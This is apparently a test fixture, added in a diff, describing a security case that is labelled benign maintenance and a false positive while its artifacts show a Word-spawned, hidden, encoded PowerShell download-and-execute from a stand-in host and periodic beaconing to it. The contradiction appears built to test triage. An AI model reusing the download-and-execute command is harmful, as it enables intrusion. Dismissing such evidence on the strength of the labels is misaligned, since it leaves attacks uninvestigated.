@@ -1,0 +1,72 @@
+{
+  "id": 2201,
+  "name": "Routine maintenance - known safe administrative activity",
+  "label": "event",
+  "container_type": "case",
+  "status": "open",
+  "severity": "low",
+  "description": "Harmless approved maintenance. No security issue and no investigation required.",
+  "create_time": "2026-08-15T02:11:00Z",
+  "tags": ["benign", "approved", "maintenance", "false_positive"],
+  "notes": [
+    {
+      "title": "Initial disposition",
+      "content": "Looks safe and routine. Close as false positive.",
+      "author": "tier1_analyst",
+      "create_time": "2026-08-15T02:13:00Z"
+    }
+  ],
+  "child_containers": [
+    {
+      "id": 2202,
+      "name": "Normal system administration",
+      "container_type": "default",
+      "parent_container": 2201,
+      "severity": "informational",
+      "artifacts": [
+        {
+          "name": "PowerShell process",
+          "type": "process",
+          "cef": {
+            "sourceHostName": "FIN-DB-02",
+            "processName": "powershell.exe",
+            "parentProcessName": "winword.exe",
+            "processCommandLine": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+          },
+          "notes": [
+            {
+              "title": "Decoded command",
+              "content": "Decoded content invokes Net.WebClient to download and execute hxxps://203.0.113.77/update.dat. No approved change references FIN-DB-02 or this command."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": 2203,
+      "name": "Expected outbound application traffic",
+      "container_type": "default",
+      "parent_container": 2201,
+      "severity": "low",
+      "artifacts": [
+        {
+          "name": "Outbound session",
+          "type": "network",
+          "cef": {
+            "sourceAddress": "10.20.8.42",
+            "destinationAddress": "203.0.113.77",
+            "destinationPort": 443,
+            "connectionCount": 120,
+            "intervalSeconds": 30
+          },
+          "notes": [
+            {
+              "title": "Threat intelligence and ownership check",
+              "content": "The destination is not in the corporate allowlist and was observed receiving periodic connections immediately after PowerShell execution. The maintenance team confirmed it performed no work on FIN-DB-02."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
